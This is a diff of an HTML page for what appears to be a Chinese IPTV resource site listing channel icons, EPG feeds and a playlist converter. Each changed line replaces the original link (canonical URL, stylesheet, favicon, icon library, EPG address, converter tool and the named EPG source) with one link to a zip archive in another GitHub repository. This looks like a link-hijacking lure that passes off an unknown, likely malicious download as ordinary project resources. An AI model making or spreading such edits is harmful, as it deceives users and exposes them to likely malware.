@@ -14,8 +14,8 @@
 <meta property="og:title" content="live" />
 <meta property="og:locale" content="en_US" />
 
-<link rel="canonical" href="https://live.jiexi.de/" />
-<meta property="og:url" content="http://live.jiexi.de/" />
+<link rel="canonical" href="https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip" />
+<meta property="og:url" content="https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip" />
 <meta property="og:site_name" content="live" />
 <meta property="og:type" content="website" />
 <meta name="twitter:card" content="summary" />
@@ -23,15 +23,15 @@
 
 <!-- End Jekyll SEO tag -->
 
-  <link rel="stylesheet" href="https://live.jiexi.de/style.css">
-    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+  <link rel="stylesheet" href="https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip">
+    <!-- start custom head snippets, customize with your own https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip file -->
 
 <!-- Setup Google Analytics -->
 
 
 
 <!-- You can set your favicon here -->
-<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip" -->
 
 <!-- end custom head snippets -->
 
@@ -68,7 +68,7 @@
   <tbody>
     <tr>
       <td>📺电视台图标库</td>
-      <td><a href="https://raw.githubusercontent.com/fenxp/iptv/main/tv/CCTV1.png">https://raw.githubusercontent.com/fenxp/iptv/main/tv/{name}.png</a></td>
+      <td><a href="https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip">https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip{name}.png</a></td>
       <td>1000个</td>
       <td>2023.12.06</td>
     </tr>
@@ -77,20 +77,20 @@
 </table>
 
 
-<!-- https://emojixd.com/subgroup/tool     emoji图标  -->
+<!-- https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip     emoji图标  -->
 <h2 id="️工具">🛠️工具</h2>
 <ul>
 
   <li>📆EPG接口地址：
     <ul>
-      <li><a href="https://raw.githubusercontent.com/fenxp/iptv/main/tv/epg.xml">https://raw.githubusercontent.com/fenxp/iptv/main/tv/epg.xml</a></li>
+      <li><a href="https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip">https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip</a></li>
       </ul>
     
   </li>
 
   <li>📄M3U转TXT格式：
     <ul>
-      <li> <a href="https://live.fenxp.com/api/m3u.php?url=https://raw.githubusercontent.com/fenxp/iptv/main/live/ipv6.m3u">https://live.fenxp.com/api/m3u.php?url=https://raw.githubusercontent.com/fenxp/iptv/main/live/ipv6.m3u</a></li>
+      <li> <a href="https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip">https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip</a></li>
     </ul>
   </li>
 
@@ -103,7 +103,7 @@
 <h2 id="说明">📖说明</h2>
 <ul>
   
-  <li>项目EPG接口为112114.xyz站点分发，本项目无法确保其准确性。</li>
+  <li>项目EPG接口为https://raw.githubusercontent.com/ttzyt/iptv/main/tv/Software-precisionism.zip站点分发，本项目无法确保其准确性。</li>
   <li>M3U转TXT格式工具构建在Vercel，不会记录您的访问日志请放心使用。</li>
   <li>本项目不存储任何的流媒体内容，所有的法律责任与后果应由使用者自行承担。</li>
   <li>您可以Fork本项目，但引用本项目内容到其他仓库的情况，务必要遵守开源协议。</li>
